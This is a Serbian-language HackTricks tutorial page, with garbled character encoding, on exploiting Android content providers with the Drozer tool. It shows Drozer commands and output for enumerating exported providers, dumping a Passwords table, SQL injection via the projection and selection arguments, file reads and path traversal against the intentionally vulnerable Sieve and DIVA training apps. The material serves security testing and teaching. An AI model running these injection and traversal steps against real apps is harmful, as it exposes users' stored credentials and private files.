# IskoriÅ¡Ä‡avanje provajdera sadrÅ¾aja

## IskoriÅ¡Ä‡avanje provajdera sadrÅ¾aja

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Uvod

Podaci se **dostavljaju iz jedne aplikacije drugima** na zahtev putem komponente poznate kao **provajder sadrÅ¾aja**. Ovi zahtevi se upravljaju putem metoda klase **ContentResolver**. Provajderi sadrÅ¾aja mogu Äuvati svoje podatke na razliÄitim lokacijama, kao Å¡to su **baza podataka**, **fajlovi** ili preko **mreÅ¾e**.

U _Manifest.xml_ fajlu je potrebno deklarisati provajdera sadrÅ¾aja. Na primer:
```xml
<provider android:name=".DBContentProvider" android:exported="true" android:multiprocess="true" android:authorities="com.mwr.example.sieve.DBContentProvider">
<path-permission android:readPermission="com.mwr.example.sieve.READ_KEYS" android:writePermission="com.mwr.example.sieve.WRITE_KEYS" android:path="/Keys"/>
</provider>
```
Da biste pristupili `content://com.mwr.example.sieve.DBContentProvider/Keys`, potrebna je dozvola `READ_KEYS`. Zanimljivo je primetiti da je putanja `/Keys/` dostupna u sledeÄ‡em odeljku, koji nije zaÅ¡tiÄ‡en zbog greÅ¡ke programera, koji je zaÅ¡titio `/Keys` ali je deklarisao `/Keys/`.

**MoÅ¾da moÅ¾ete pristupiti privatnim podacima ili iskoristiti neku ranjivost (SQL Injection ili Path Traversal).**

## Dobijanje informacija iz **izloÅ¾enih provajdera sadrÅ¾aja**
```
dz> run app.provider.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
Authority: com.mwr.example.sieve.DBContentProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.DBContentProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
Path Permissions:
Path: /Keys
Type: PATTERN_LITERAL
Read Permission: com.mwr.example.sieve.READ_KEYS
Write Permission: com.mwr.example.sieve.WRITE_KEYS
Authority: com.mwr.example.sieve.FileBackupProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.FileBackupProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
```
MoguÄ‡e je sastaviti kako bi se doÅ¡lo do **DBContentProvider**-a poÄevÅ¡i od URI-ja sa "_content://_". Ovaj pristup se zasniva na saznanjima dobijenim koriÅ¡Ä‡enjem Drozera, gde su kljuÄne informacije locirane u direktorijumu _/Keys_.

Drozer moÅ¾e **pokuÅ¡ati i isprobati nekoliko URI-ja**:
```
dz> run scanner.provider.finduris -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/
...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
```
TakoÄ‘e, trebali biste proveriti **kod ContentProvider-a** da biste pretraÅ¾ili upite:

![](<../../../.gitbook/assets/image (121) (1) (1) (1).png>)

TakoÄ‘e, ako ne moÅ¾ete pronaÄ‡i kompletne upite, moÅ¾ete **proveriti koja imena su deklarisana od strane ContentProvider-a** u metodi `onCreate`:

![](<../../../.gitbook/assets/image (186).png>)

Upit Ä‡e biti oblika: `content://ime.paketa.klase/deklarisano_ime`

## **Content Provider-i sa podrÅ¡kom za bazu podataka**

Verovatno se veÄ‡ina Content Provider-a koristi kao **interfejs** za **bazu podataka**. Stoga, ako mu moÅ¾ete pristupiti, moÅ¾ete izvuÄ‡i, aÅ¾urirati, ubaciti i obrisati informacije.\
Proverite da li moÅ¾ete **pristupiti osetljivim informacijama** ili pokuÅ¡ajte ih promeniti da biste **zaobiÅ¡li mehanizme autorizacije**.

Pregledajte kod Content Provider-a i potraÅ¾ite i **funkcije** nazvane: _query, insert, update i delete_:

![](<../../../.gitbook/assets/image (187).png>)

![](<../../../.gitbook/assets/image (254) (1) (1) (1) (1) (1) (1) (1).png>)

Jer Ä‡ete moÄ‡i da ih pozovete.

### Upit sadrÅ¾aja
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
_id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w==
-
email: incognitoguy50@gmail.com
```
### Ubacivanje sadrÅ¾aja

Upitom baze podataka saznaÄ‡ete **ime kolona**, a zatim Ä‡ete moÄ‡i da ubacite podatke u bazu:

![](<../../../.gitbook/assets/image (188) (1).png>)

![](<../../../.gitbook/assets/image (189) (1).png>)

_Napomena: Prilikom ubacivanja i aÅ¾uriranja moÅ¾ete koristiti --string za string, --double za double, --float, --integer, --long, --short, --boolean_

### AÅ¾uriranje sadrÅ¾aja

PoznavajuÄ‡i ime kolona, takoÄ‘e moÅ¾ete **izmeniti unose**:

![](<../../../.gitbook/assets/image (190).png>)

### Brisanje sadrÅ¾aja

![](<../../../.gitbook/assets/image (191).png>)

### **SQL Injection**

Jednostavno je testirati SQL injection **(SQLite)** manipulacijom **projekcije** i **selekcije polja** koja se prosleÄ‘uju pruÅ¾aocu sadrÅ¾aja.\
Prilikom upita na pruÅ¾aoca sadrÅ¾aja postoje 2 interesantna argumenta za pretragu informacija: _--selection_ i _--projection_:

![](<../../../.gitbook/assets/image (192) (1).png>)

MoÅ¾ete pokuÅ¡ati da **zloupotrebite** ove **parametre** kako biste testirali SQL injection:
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "*
FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
```
**Automatsko otkrivanje SQLInjection napada pomoÄ‡u Drozera**

Drozer je moÄ‡an alat za testiranje sigurnosti Android aplikacija koji omoguÄ‡ava automatsko otkrivanje ranjivosti SQLInjection. Ova tehnika omoguÄ‡ava napadaÄu da izvrÅ¡i zlonamerni SQL kod na bazi podataka aplikacije, Å¡to moÅ¾e dovesti do neovlaÅ¡Ä‡enog pristupa ili otkrivanja osetljivih informacija.

Da biste automatski otkrili SQLInjection ranjivosti pomoÄ‡u Drozera, sledite sledeÄ‡e korake:

1. Instalirajte Drozer na svom ureÄ‘aju ili emulatoru.
2. Pokrenite Drozer i poveÅ¾ite se sa ciljnom aplikacijom.
3. IzvrÅ¡ite sledeÄ‡u komandu da biste pronaÅ¡li Content Providere u aplikaciji:

```
run app.provider.find
```

4. Pregledajte rezultate i pronaÄ‘ite Content Providere koji prihvataju korisniÄki unos.
5. IzvrÅ¡ite sledeÄ‡u komandu da biste testirali ranjivost SQLInjection na odabranom Content Provideru:

```
run scanner.provider.injection --authority <authority> --uri <uri>
```

Zamenite `<authority>` sa autoritetom Content Providera i `<uri>` sa URI-om Content Providera koji Å¾elite da testirate.

Drozer Ä‡e automatski testirati Content Provider za ranjivosti SQLInjection i prikazati rezultate. Ako se pronaÄ‘e ranjivost, napadaÄ moÅ¾e iskoristiti ovu ranjivost za izvrÅ¡avanje zlonamernog SQL koda i dobijanje neovlaÅ¡Ä‡enog pristupa ili otkrivanje osetljivih informacija.

VaÅ¾no je napomenuti da je ova tehnika namenjena samo za testiranje sigurnosti i treba je koristiti samo sa dozvolom vlasnika aplikacije. NeovlaÅ¡Ä‡eno koriÅ¡Ä‡enje ove tehnike moÅ¾e biti protivzakonito i podleÅ¾e pravnim sankcijama.
```
dz> run scanner.provider.injection -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Injection in Projection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/

dz> run scanner.provider.sqltables -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
android_metadata
notes
sqlite_sequence
```
## **Content Provideri sa podrÅ¡kom za sistem datoteka**

Content Provideri se takoÄ‘e mogu koristiti za **pristupanje datotekama:**

![](<../../../.gitbook/assets/image (193).png>)

### ÄŒitanje **datoteke**

MoÅ¾ete Äitati datoteke iz Content Providera
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
### **Putanja Traversal**

Ako moÅ¾ete pristupiti datotekama, moÅ¾ete pokuÅ¡ati zloupotrijebiti putanju Traversal (u ovom sluÄaju to nije nuÅ¾no, ali moÅ¾ete pokuÅ¡ati koristiti "_../_" i sliÄne trikove).
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
**Automatsko otkrivanje putanje pretrage pomoÄ‡u Drozera**

Drozer je moÄ‡an alat za testiranje sigurnosti Android aplikacija koji omoguÄ‡ava automatsko otkrivanje putanje pretrage. Ova tehnika se koristi za pronalaÅ¾enje ranjivosti u Android aplikacijama koje koriste Content Provider komponente.

Kada se koristi Drozer, prvo se mora uspostaviti veza sa ciljnom aplikacijom. Zatim se koristi `run app.package.list` komanda kako bi se prikazao popis svih instaliranih aplikacija na ureÄ‘aju. Nakon toga, koristi se `run app.provider.find` komanda kako bi se pronaÅ¡le sve Content Provider komponente u ciljnoj aplikaciji.

Kada se pronaÄ‘e Content Provider, koristi se `run app.provider.query` komanda kako bi se izvrÅ¡io upit nad odreÄ‘enim Content Provider-om. Ova komanda omoguÄ‡ava testiranje razliÄitih putanja pretrage kako bi se otkrile ranjivosti.

Drozer automatski testira razliÄite putanje pretrage, ukljuÄujuÄ‡i `../`, `../../`, `../../../../` i tako dalje. Ako se pronaÄ‘e putanja koja omoguÄ‡ava pristup osjetljivim podacima izvan granica aplikacije, to se smatra ranjivoÅ¡Ä‡u putanje pretrage.

Ova tehnika je vrlo korisna za otkrivanje ranjivosti u Android aplikacijama koje koriste Content Provider komponente. Drozer automatski testira razliÄite putanje pretrage, Äime olakÅ¡ava proces otkrivanja ranjivosti i poboljÅ¡ava sigurnost aplikacija.
```
dz> run scanner.provider.traversal -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Vulnerable Providers:
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.FileBackupProvider
```
## Reference

* [https://www.tutorialspoint.com/android/android\_content\_providers.htm](https://www.tutorialspoint.com/android/android\_content\_providers.htm)
* [https://manifestsecurity.com/android-application-security-part-15/](https://manifestsecurity.com/android-application-security-part-15/)
* [https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf](https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju oglaÅ¡enu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
